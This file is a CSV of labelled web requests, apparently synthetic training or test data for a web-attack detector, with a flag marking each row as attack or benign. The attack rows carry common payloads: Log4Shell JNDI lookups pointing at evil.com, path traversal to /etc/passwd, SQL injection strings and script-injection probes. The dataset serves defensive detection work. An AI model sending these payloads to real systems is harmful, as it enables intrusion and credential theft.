request_method,url,payload,user_agent,response_code,is_attack
PUT,/app/page23?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page92?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page77,,Nikto/2.1.6,200,0
GET,/app/page37?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page96?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
DELETE,/app/page39?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page2?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page55,,sqlmap/1.0,200,0
GET,/app/page98?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page19,,sqlmap/1.0,404,0
GET,/app/page33,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page16,,Nikto/2.1.6,200,0
GET,/app/page48,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page99,,sqlmap/1.0,404,0
GET,/app/page33?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page82,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page68,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page7,,sqlmap/1.0,200,0
GET,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page54,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page64,,Nikto/2.1.6,200,0
GET,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page53?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page87,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page54?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page27,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page24,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page65?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page52,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page8,,sqlmap/1.0,200,0
GET,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page13?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (compatible; Baiduspider/2.0),404,1
GET,/app/page55?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page1?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page89,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page63?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page86?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page62?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,403,1
GET,/app/page94,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page52,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page69,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page33,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page33?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page93,,Nikto/2.1.6,200,0
GET,/app/page68,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page89?' OR 1=1 --,' OR 1=1 --,Nikto/2.1.6,403,1
GET,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page86?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page16,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page53?<script>alert('xss')</script>,<script>alert('xss')</script>,sqlmap/1.0,500,1
OPTIONS,/app/page5,,sqlmap/1.0,200,0
DELETE,/app/page9?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,500,1
GET,/app/page50,,Nikto/2.1.6,200,0
GET,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page89,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page54,,sqlmap/1.0,200,0
GET,/app/page45?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page39,,sqlmap/1.0,200,0
GET,/app/page25,,Nikto/2.1.6,200,0
GET,/app/page32?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
OPTIONS,/app/page36,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
POST,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page87,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page76?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page27,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page92?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page69,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page49,,Nikto/2.1.6,200,0
GET,/app/page55,,Nikto/2.1.6,404,0
OPTIONS,/app/page53,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page62?<script>alert('xss')</script>,<script>alert('xss')</script>,Nikto/2.1.6,403,1
GET,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page94,,sqlmap/1.0,200,0
GET,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page98,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page63,,sqlmap/1.0,200,0
PUT,/app/page30,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page56?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Nikto/2.1.6,500,1
GET,/app/page77,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page23?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page56,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
DELETE,/app/page61?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page47,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page61?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page79?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page88?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
PUT,/app/page18?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page28?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page25,,Nikto/2.1.6,200,0
POST,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page83,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page31?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page75?eval(String.fromCharCode(,eval(String.fromCharCode(,Nikto/2.1.6,500,1
PUT,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page26,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page47?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,403,1
GET,/app/page3?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
OPTIONS,/app/page13?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page75,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page69?../../../etc/passwd,../../../etc/passwd,Nikto/2.1.6,500,1
GET,/app/page35?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),404,1
GET,/app/page14?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
GET,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page14,,Nikto/2.1.6,200,0
GET,/app/page97,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page51,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page27,,sqlmap/1.0,200,0
GET,/app/page55,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page74?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page52?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page27,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page68,,sqlmap/1.0,200,0
POST,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page86?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page54,,Nikto/2.1.6,200,0
GET,/app/page15,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page26,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page59?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page88?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page13,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page30,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page94?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page87,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page54,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page16?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page7?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,403,1
GET,/app/page2,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page94?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page24,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page96?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page73,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page98,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page41,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page87?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page98?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page85?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
DELETE,/app/page65?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page11?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
PUT,/app/page55,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page36,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page98,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page12,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page74?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page21,,sqlmap/1.0,404,0
OPTIONS,/app/page82,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page47,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page86,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page24?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page90,,sqlmap/1.0,200,0
GET,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page66?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page32?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page10,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page49?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page37,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page43,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
POST,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page20,,Nikto/2.1.6,200,0
GET,/app/page98,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
PUT,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page3?' OR 1=1 --,' OR 1=1 --,Nikto/2.1.6,403,1
GET,/app/page98?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page25,,Nikto/2.1.6,200,0
PUT,/app/page11,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page28,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page93,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page77,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page97,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page53,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page45,,Nikto/2.1.6,200,0
GET,/app/page53,,sqlmap/1.0,200,0
POST,/app/page93?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
OPTIONS,/app/page17?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page70,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page28?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page68?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page29,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page29,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page32,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page81,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page59,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page58?' OR 1=1 --,' OR 1=1 --,Nikto/2.1.6,500,1
GET,/app/page15?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page53,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page46,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page84,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page2,,sqlmap/1.0,200,0
GET,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page11,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page86?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,403,1
GET,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page97,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page26,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page15?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page76,,Nikto/2.1.6,404,0
GET,/app/page7,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page12,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page55,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page32,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page96?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page85,,sqlmap/1.0,404,0
GET,/app/page20,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page98,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page42,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page18?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
PUT,/app/page87,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page38,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page89,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page28,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page56?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page84,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page49,,Nikto/2.1.6,404,0
PUT,/app/page61?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
PUT,/app/page29?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page51,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page43,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page56,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page45,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page30,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page89,,Nikto/2.1.6,404,0
POST,/app/page68,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page98,,sqlmap/1.0,404,0
POST,/app/page88,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page71,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page96?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
